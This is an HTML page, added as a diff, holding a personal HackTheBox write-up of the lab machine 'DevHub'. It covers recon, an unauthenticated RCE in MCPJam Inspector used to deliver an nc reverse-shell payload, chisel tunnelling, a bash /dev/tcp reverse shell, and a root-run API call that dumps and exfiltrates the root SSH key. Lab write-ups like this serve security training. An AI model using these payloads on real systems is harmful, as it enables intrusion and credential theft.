@@ -1,0 +1,187 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DevHub — HTB Writeup | Anmol Chaudhary</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=IBM+Plex+Mono:wght@400;500;600&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../styles.css">
+<style>
+  .wu { max-width: 820px; margin: 0 auto; padding: 56px 20px 80px; }
+  .wu-back { font-family: var(--mono); font-size: 0.85rem; color: var(--text-dim); display: inline-flex; align-items: center; gap: 6px; margin-bottom: 24px; transition: color 0.2s ease; }
+  .wu-back:hover { color: var(--accent); text-decoration: none; }
+  .wu-meta { display: flex; align-items: center; gap: 12px; margin: 14px 0 32px; font-family: var(--mono); font-size: 0.85rem; }
+  .wu-date { color: var(--text-dim); margin-left: 6px; }
+  .wu h1 { font-size: 1.8rem; margin: 12px 0 8px; color: var(--text); border-bottom: 1px solid var(--border); padding-bottom: 12px; }
+  .wu h2 { font-size: 1.25rem; margin: 36px 0 14px; color: var(--accent); }
+  .wu h3 { font-size: 1.05rem; margin: 24px 0 10px; color: #f6efe2; }
+  .wu h4 { font-size: 0.95rem; margin: 18px 0 8px; color: var(--text); }
+  .wu p { color: var(--text); max-width: 72ch; margin: 0 0 16px; line-height: 1.65; }
+  .wu pre {
+    background: var(--surface); border: 1px solid var(--border); border-left: 3px solid var(--accent);
+    border-radius: var(--radius); padding: 14px 18px; overflow-x: auto; font-family: var(--mono);
+    font-size: 0.86rem; color: var(--ok); margin: 18px 0 24px; box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+  }
+  .wu code { font-family: var(--mono); background: var(--surface-2); padding: 2px 6px; border-radius: 3px; font-size: 0.88em; border: 1px solid var(--border); }
+  .wu pre code { background: transparent; padding: 0; border: none; font-size: inherit; }
+  .table-wrap { overflow-x: auto; margin: 20px 0; border: 1px solid var(--border); border-radius: var(--radius); }
+  .wu table { width: 100%; border-collapse: collapse; font-family: var(--mono); font-size: 0.85rem; text-align: left; }
+  .wu th, .wu td { padding: 10px 14px; border-bottom: 1px solid var(--border); }
+  .wu th { background: var(--surface-2); color: var(--accent); font-weight: 600; }
+  .wu tr:last-child td { border-bottom: none; }
+  .wu ul, .wu ol { color: var(--text); padding-left: 24px; margin: 12px 0 20px; }
+  .wu li { margin-bottom: 8px; }
+  .wu hr { border: none; border-top: 1px solid var(--border); margin: 36px 0; }
+</style>
+</head>
+<body>
+<header class="nav">
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-prompt">anmol@portfolio<span class="nav-sep">:~$</span><span class="cursor">_</span></a>
+    <a href="../index.html#writeups" class="wu-back" style="margin-bottom:0;">&larr; writeups directory</a>
+  </div>
+</header>
+
+<main class="wu">
+  <a href="../index.html#writeups" class="wu-back">&larr; back to all writeups</a>
+  <h1>DevHub</h1>
+  <div class="wu-meta">
+    <span class="os-tag os-linux">Linux</span>
+    <span class="diff-tag diff-medium">Medium</span>
+    <span class="wu-date">Pwned: 2026-05-31</span>
+  </div>
+
+  <h2>Machine Info</h2>
+  <div class="table-wrap"><table><thead><tr><th>Field</th><th>Details</th></tr></thead><tbody>
+  <tr><td>Machine Name</td><td>DevHub</td></tr>
+  <tr><td>OS</td><td>Linux</td></tr>
+  <tr><td>Difficulty</td><td>Medium</td></tr>
+  <tr><td>Status</td><td>Pwned</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Tools Used</h2>
+  <hr>
+  <h2>Summary</h2>
+  <p><strong>DevHub</strong> is a developer-focused machine centred around real-world MCP tooling vulnerabilities, where initial access is gained via an unauthenticated RCE in MCPJam Inspector (CVE-2026-23744) on port 6274, followed by lateral movement through a Jupyter server with a hardcoded token.</p>
+  <p>Privilege escalation to root is achieved by abusing a writable internal Flask API (<code>opsmcp</code>) running as root, which exposes a hidden credential dump endpoint that leaks the root SSH private key.</p>
+  <hr>
+  <h2>Reconnaissance</h2>
+  <h3>Initial Scan (NMAP)</h3>
+  <p>Initial scan reveals website running on port 80.</p>
+  <pre><code># Nmap 7.98 scan initiated Sat May 30 15:54:58 2026 as: /usr/lib/nmap/nmap --privileged -sC -sV -oN recon/scan.txt 10.129.46.149
+Nmap scan report for 10.129.46.149
+Host is up (0.23s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 35:78:2e:79:0d:87:13:05:2f:53:8e:e7:3c:55:b6:4c (ECDSA)
+|_  256 dd:56:8e:bc:da:b8:38:3e:9a:cd:0b:74:ee:53:85:f8 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://devhub.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sat May 30 15:55:29 2026 -- 1 IP address (1 host up) scanned in 31.34 seconds</code></pre>
+  <p>Further enumeration on site reveals <code>MCPJAM</code> Inspector service running on port <code>6274</code> &amp; an internal site running on port <code>8888</code>.</p>
+  <p><strong>Open Ports:</strong></p>
+  <div class="table-wrap"><table><thead><tr><th>Port</th><th>Service</th><th>Version</th><th>Notes</th></tr></thead><tbody>
+  <tr><td>22</td><td>ssh</td><td>8.9p1</td><td></td></tr>
+  <tr><td>80</td><td>http site running on nginx</td><td>1.18.0</td><td></td></tr>
+  <tr><td>6274</td><td>MCPJAm Inspector</td><td>1.4.2</td><td></td></tr>
+  <tr><td>8888</td><td>Jupyter</td><td>N/A</td><td>Discovered later while post exploitation.</td></tr>
+  <tr><td>5555</td><td></td><td></td><td>Discovered later while performing PE.</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Vulnerability Identification</h2>
+  <p>MCPJam inspector is the local-first development platform for MCP servers. The Latest version Versions 1.4.2 and earlier are vulnerable to remote code execution (RCE) vulnerability, which allows an attacker to send a crafted HTTP request that triggers the installation of an MCP server, leading to RCE.</p>
+  <h3>CVEs / Vulnerabilities Identified</h3>
+  <div class="table-wrap"><table><thead><tr><th>CVE</th><th>Description</th><th>Severity</th></tr></thead><tbody>
+  <tr><td>CVE-2026-23744</td><td>Unauthenticated RCE in MCPJam Inspector (CVSS 9.8)&lt;br&gt;Versions <strong>1.4.2 and earlier</strong> of MCPJam Inspector are vulnerable to RCE. An attacker can send a crafted HTTP request that triggers the installation of an MCP server, leading to RCE. This vulnerability is <strong>more severe than CVE-2025-49596</strong> — while that one requires tricking a user into clicking a malicious link, this one is <strong>exploitable with no user interaction.</strong></td><td>Critical</td></tr>
+  </tbody></table></div>
+  <hr>
+  <h2>Initial Foothold / Initial Access</h2>
+  <h3>CVE-2026-23744</h3>
+  <p><strong>Description:</strong> To exploit the vulnerability, <a href="https://github.com/advisories/GHSA-232v-j27c-5pp6" target="_blank" rel="noopener">this proof of concept</a> was used as a reference. We used the same command in linux format to trigger a reverse shell</p>
+  <p>Sending the following command while keeping the netcat listening for 4444 gives us initial foothold</p>
+  <pre><code>curl -X POST http://devhub.htb:6274/api/mcp/connect \
+  -H &quot;Content-Type: application/json&quot; \
+  -d &#x27;{&quot;serverConfig&quot;:{&quot;command&quot;:&quot;/bin/sh&quot;,&quot;args&quot;:[&quot;-c&quot;,&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.23 4444 &gt;/tmp/f&quot;],&quot;env&quot;:{}},&quot;serverId&quot;:&quot;pwned&quot;}&#x27;</code></pre>
+  <hr>
+  <h2>Post-Exploitation</h2>
+  <h3>System Enumeration</h3>
+  <p>At starting of the recon phase we discovered that the port 8888 are running locally on http://localhost:8888. To reverse the ports back to our client machine, we use chisel.</p>
+  <pre><code>#On client machine
+wget https://github.com/jpillora/chisel/releases/latest/download/chisel_linux_amd64.gz gunzip chisel_linux_amd64.gz
+
+chmod +x chisel_linux_amd64
+
+./chisel_linux_amd64 server -p 9000 --reverse</code></pre>
+  <pre><code>#On DevHub foothold
+
+curl http://10.10.14.23:9000/chisel_linux_amd64 -o /tmp/chisel
+chmod +x /tmp/chisel
+
+# Forward port 8888 back to you
+/tmp/chisel client 10.10.14.23:9000 R:8888:127.0.0.1:8888</code></pre>
+  <p>Visiting the http://localhost:8888 from our local machine reverses us to the forwarded ports of the machine which is running a Jupyter server which requires a secret token for user authentication.</p>
+  <h3>Credential Discovery</h3>
+  <p>Further enumeration on initial foothold provides a token for the user analyst which gives us access to Jupyter.</p>
+  <pre><code>find /etc/systemd -name &quot;*.service&quot; 2&gt;/dev/null | xargs grep -l token grep:
+...
+&quot;/etc/systemd/system/multi-user.target.wants/jupyter.service&quot;
+
+a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
+
+cat /etc/systemd/system/jupyter.service
+
+---SNIP---
+&#x27;a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7&#x27;
+---SNIP---</code></pre>
+  <h2>Lateral Movement (Pivoting to user &#x27;analyst&#x27;)</h2>
+  <p>Running the url authenticates us on the jupyter.</p>
+  <pre><code>http://127.0.0.1:8888/?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7</code></pre>
+  <p>Creating a new terminal on Jupyter server and running a reverse shell command gives us a reverse shell for the user &#x27;analyst&#x27;.</p>
+  <pre><code>#In Jupyter Terminal
+bash -i &gt;&amp; /dev/tcp/10.10.14.23/5555 0&gt;&amp;1
+
+#In local machine
+nc -lvnp 5555</code></pre>
+  <h3>User Flag</h3>
+  <pre><code>---CENSORED---</code></pre>
+  <hr>
+  <h2>Privilege Escalation</h2>
+  <h3>Enumeration</h3>
+  <p>Uploading linpeas and running scan reveals that we have root access to /opt/opsmcp/servers.py which is running an internal server on port 5000</p>
+  <p>Further investigation and after reading the servers.py code we discover that, there&#x27;s a hidden <code>ops._admin_dump</code> endpoint that runs as root and can dump the root SSH keys. We can call it directly.</p>
+  <pre><code>curl -s -X POST http://127.0.0.1:5000/tools/call \
+  -H &quot;Content-Type: application/json&quot; \
+  -H &quot;X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a&quot; \ #Secret key found inside the scripts.py code.
+  -d &#x27;{&quot;name&quot;: &quot;ops._admin_dump&quot;, &quot;arguments&quot;: {&quot;target&quot;: &quot;ssh_keys&quot;, &quot;confirm&quot;: true}}&#x27; \
+  | python3 -c &quot;import sys,json; print(json.load(sys.stdin)[&#x27;root_private_key&#x27;])&quot; &gt; /tmp/root_key</code></pre>
+  <p>Transferring the fetched SSH key back to our machine, we can login as root.</p>
+  <pre><code># On your kali first:
+nc -lvnp 7777 &gt; root_id_rsa
+
+# On target:
+nc 10.10.14.23 7777 &lt; /tmp/root_key
+chmod 600 root_id_rsa</code></pre>
+  <pre><code>ssh -i root_id_rsa root@devhub.htb</code></pre>
+  <h3>Root Flag</h3>
+  <pre><code>---CENSORED---</code></pre>
+  <hr>
+  <h2>Trophy</h2>
+  <pre><code>https://labs.hackthebox.com/achievement/machine/1574945/903</code></pre>
+  <hr>
+  <p><em>Completed as part of HackTheBox practice in a legal, controlled environment.</em></p>
+</main>
+
+<footer class="footer">
+  <p>&copy; <span id="year"></span> Anmol Chaudhary — built with HTML, CSS, and curiosity.</p>
+</footer>
+<script>document.getElementById('year').textContent = new Date().getFullYear();</script>
+</body>
+</html>
